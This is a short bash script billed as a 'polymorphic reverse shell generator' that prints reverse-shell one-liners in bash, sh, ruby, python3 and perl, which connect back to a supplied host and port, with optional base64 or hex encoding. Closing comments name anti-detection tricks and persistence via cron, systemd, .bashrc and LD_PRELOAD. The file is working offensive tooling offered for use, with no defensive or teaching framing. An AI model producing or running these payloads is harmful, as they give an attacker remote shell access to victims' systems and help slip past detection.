#!/bin/bash
# HEXAGON POLYMORPHIC REVERSE SHELL GENERATOR
# USAGE: ./shell_03.sh <LHOST> <LPORT> [ENCODING]

LHOST=${1:-"127.0.0.1"}
LPORT=${2:-4444}
ENC=${3:-"base64"}

PAYLOADS=(
  "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
  "0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"
  "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$LHOST\",\"$LPORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
  "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  "perl -e 'use Socket;$i=\"$LHOST\";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'"
)

for p in "${PAYLOADS[@]}"; do
  if [[ "$ENC" == "base64" ]]; then
    echo "$p" | base64 -w0
  elif [[ "$ENC" == "hex" ]]; then
    echo -n "$p" | xxd -p -c0
  else
    echo "$p"
  fi
done

# ANTI-DETECTION: Random delays, variable names, junk code
# PERSISTENCE: Cron + systemd + .bashrc + LD_PRELOAD